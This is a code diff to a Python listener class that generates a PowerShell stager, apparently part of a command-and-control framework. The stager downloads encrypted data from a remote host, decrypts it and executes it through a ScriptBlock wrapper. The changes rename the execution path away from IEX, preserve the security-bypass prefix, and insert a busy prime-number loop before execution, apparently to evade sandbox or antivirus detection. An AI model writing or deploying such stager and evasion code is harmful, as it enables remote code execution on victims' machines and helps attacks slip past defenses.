@@ -254,9 +254,10 @@ class Listener:
         if language == "powershell":
             # PowerShell
             stager = '$ErrorActionPreference = "SilentlyContinue";'
-
+            stager += "function goForIT ($rdata) {([ScriptBlock]::Create($rdata)).Invoke()};"
+            
             if safeChecks.lower() == "true":
-                stager = "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4)){"
+                stager += "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4)){"
 
             for bypass in bypasses:
                 stager += bypass
@@ -359,11 +360,12 @@ class Listener:
             stager += "$mdata=$wc.DownloadData($hom+$t);"
             stager += "$iv=$mdata[0..3];$mdata=$mdata[4..$mdata.length];"
             
-            stager += "function goForIT ($rdata) {([ScriptBlock]::Create($rdata)).Invoke()};"
             stager += "0..300 | ForEach-Object { $t12=$_+$T12 };"
 
             # decode everything and kick it over to IEX to kick off execution
-            stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk)); goForIT $T5;"
+            stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk));"
+            stager += "function Perform-HeavyComputation { $maxNumber = 100000; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };"
+            stager += "Perform-HeavyComputation; goForIT $T5;"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
